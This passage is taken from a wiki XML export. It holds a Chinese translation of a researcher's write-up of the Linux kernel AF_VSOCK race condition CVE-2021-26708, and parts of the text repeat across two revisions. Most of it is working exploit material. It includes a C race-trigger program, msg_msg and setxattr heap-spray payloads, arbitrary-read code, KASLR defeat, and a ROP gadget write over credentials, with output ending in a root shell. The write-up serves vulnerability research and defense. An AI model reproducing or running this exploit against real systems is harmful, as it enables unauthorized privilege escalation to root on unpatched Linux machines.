這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/translate&gt;

&lt;translate&gt;
==四字節的力量==
&lt;/translate&gt;

&lt;translate&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。

第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/translate&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;translate&gt;
前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。
&lt;/translate&gt;

&lt;translate&gt;
==內核信息洩露==
&lt;/translate&gt;

&lt;translate&gt;
這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;/translate&gt;
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
&lt;translate&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。
&lt;/translate&gt;

&lt;translate&gt;
==實現任意讀==
&lt;/translate&gt;

&lt;translate&gt;
===從 arbitrary free 到 use-after-free===
&lt;/translate&gt;

&lt;translate&gt;
從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：
&lt;/translate&gt;

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
&lt;translate&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;/translate&gt;
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
&lt;translate&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。
&lt;/translate&gt;

&lt;translate&gt;
===任意讀的步驟===
&lt;/translate&gt;

&lt;translate&gt;
準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；
&lt;/translate&gt;

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

&lt;translate&gt;
如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；
&lt;/translate&gt;

[[File:T0140baae964febb059.png | 600px ]]

&lt;translate&gt;
通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;/translate&gt;
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

&lt;translate&gt;
==尋找攻擊目標==
&lt;/translate&gt;

&lt;translate&gt;
以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。

下面是該漏洞如何從內存中提取這些指針:
&lt;/translate&gt;

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;translate&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/translate&gt;

&lt;translate&gt;
Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。

我構建了以下步驟：

1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字

2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()

3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()

4.對vsock_sock執行任意讀取過程

5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)

6.對這個可能的sk_buff地址執行任意讀

7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6

8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上

9.對sk_buff內核地址進行任意釋放

10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads

11.使用recv()接收服務器套接字的網絡消息。
&lt;/translate&gt;

&lt;translate&gt;
==通過skb_shared_info 進行任意寫==
&lt;/translate&gt;

&lt;translate&gt;
以下是覆蓋sk_buff對象的有效payload：
&lt;/translate&gt;

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

&lt;translate&gt;
skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：
&lt;/translate&gt;

[[File:T0185ccbf9f025c74da.png  | 600px]]

&lt;translate&gt;
下面講講destructor_arg 回調:
&lt;/translate&gt;
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

&lt;translate&gt;
由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。

callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;/translate&gt;
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

&lt;translate&gt;
==視頻==
&lt;/translate&gt;
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;

&lt;translate&gt;

==參考==
&lt;/translate&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>kihurljgkztjd1ay3rzvzy58khjmruk</sha1>
    </revision>
    <revision>
      <id>2094</id>
      <parentid>2093</parentid>
      <timestamp>2021-05-04T03:24:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>2094</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="25517" sha1="epm0nb353soxgq8npnf5susmz89cji8" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==脆弱點== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
這些漏洞是由&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;中的錯誤鎖定引起的條件競爭。這些條件競爭是在2019年11月添加VSOCK多傳輸支持的提交中隱式引入的，並被合併到Linux內核5.5-rc1版本中。

&lt;!--T:3--&gt;
&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;和&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;在所有主要的GNU/Linux發行版中都作為內核模塊提供。當你為AF_VSOCK域創建一個套接字時，這些易受攻擊的模塊會自動加載。
&lt;/translate&gt;
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:4--&gt;
&lt;code&gt;AF_VSOCK&lt;/code&gt;套接字的創建對非特權用戶來說是可用的，並不需要用戶名空間。
&lt;/translate&gt;


&lt;translate&gt;
==內存破壞== &lt;!--T:5--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:6--&gt;
下面詳細介紹CVE-2021-26708的利用，利用了&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;中的條件競爭，復現需要兩個線程，第一個線程調用&lt;code&gt;setsockopt()&lt;/code&gt;：
&lt;/translate&gt;
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



&lt;translate&gt;
&lt;!--T:7--&gt;
第二個線程在&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;試圖獲取套接字鎖時改變虛擬套接字傳輸，通過重新連接虛擬套接字實現：
&lt;/translate&gt;
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


&lt;translate&gt;
&lt;!--T:8--&gt;
為了處理虛擬套接字的&lt;code&gt;connect()&lt;/code&gt;，內核執行調用&lt;code&gt;vsock_assign_transport()&lt;/code&gt;的&lt;code&gt;vsock_stream_connect()&lt;/code&gt;。這個函數包含如下代碼：
&lt;/translate&gt;
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:9--&gt;
&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。

&lt;!--T:10--&gt;
內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;/translate&gt;
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:11--&gt;
这里，vvs是指向内核内存的指针，它已经在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被释放。&lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小为64字节，位于kmalloc-64块缓存中。buf_alloc字段类型为u32，位于偏移量40。&lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。*val的值由攻击者控制，它的四个最不重要的字节被写入释放的内存中。
&lt;/translate&gt;

&lt;translate&gt;
==模糊測試== &lt;!--T:12--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:13--&gt;
syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;/translate&gt;
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:14--&gt;
只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;/translate&gt;
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:15--&gt;
這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。
&lt;/translate&gt;

&lt;translate&gt;
==四字節的力量== &lt;!--T:16--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:17--&gt;
這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。

&lt;!--T:18--&gt;
第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;/translate&gt;
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:19--&gt;
